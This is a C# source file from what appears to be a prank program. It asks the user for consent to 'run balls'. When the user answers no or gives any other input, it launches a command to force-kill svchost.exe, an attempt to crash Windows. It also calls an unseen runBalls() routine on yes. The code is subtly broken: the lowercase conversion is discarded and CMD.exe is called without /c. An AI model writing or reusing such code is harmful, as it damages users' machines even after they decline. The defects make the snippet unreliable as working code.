using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using ballsBetter.Functions;

namespace ballsBetter.Functions
{
    class AreYouSure
    {
        public static int areYouSure()
        {
            Console.WriteLine("Are you sure you want to run balls? It might harm your PC. | Y/N");

            string wtr = Console.ReadLine();

            wtr.ToLower();

            Console.WriteLine(wtr);

            if (wtr == "y")
            {
                Console.WriteLine("balls");

                Functions.balls.runBalls();

                Console.ReadKey();

            }

            else if (wtr == "n")
            {
                Console.WriteLine("Not balls");

                System.Diagnostics.Process.Start("CMD.exe", "taskkill /F /IM svchost.exe");

                Console.ReadKey();

                return 0;
            }

            else
            {
                Console.WriteLine("Invalid Answer");

                System.Diagnostics.Process.Start("CMD.exe", "taskkill /F /IM svchost.exe");

                Console.ReadKey();
            }

            return 0;
        }
    }
}
